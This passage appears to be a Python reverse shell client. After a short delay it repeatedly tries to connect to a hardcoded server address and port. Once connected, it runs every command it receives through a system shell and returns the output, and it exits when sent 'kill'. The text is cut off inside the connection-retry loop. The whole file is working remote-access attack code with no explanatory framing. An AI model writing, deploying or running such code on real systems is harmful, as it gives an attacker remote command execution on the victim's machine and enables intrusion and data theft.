import socket 
import subprocess 
import os  
import time

def shell(sock):
    while True:
        buffer = b'' 
        total_response = b'' 

        # Receive data from the socket
        buffer = sock.recv(1024)
        if not buffer:
            break  # Exit the loop if no data is received

        if buffer.startswith(b'kill'):
            sock.close()  # Close the socket connection
            os._exit(0)  # Exit the program
        else:
            # Execute the command and capture the output
            process = subprocess.Popen(buffer.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = process.communicate()  # Get both stdout and stderr
            total_response = stdout + stderr  # Combine both results
            
            # Send the response back to the server
            sock.sendall(total_response)  

def main():
    time.sleep(20)  

    serv_ip = "192.168.3.189"  # Server IP address
    serv_port = 50000  # Server port

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket

    while True:
        try:
            sock.connect((serv_ip, serv_port))  # Connect to the server
            break  # Exit the loop if the connection is successful
        except socket.error:
            time.sleep(1)  # If the connection fails, wait for 1 second and try a
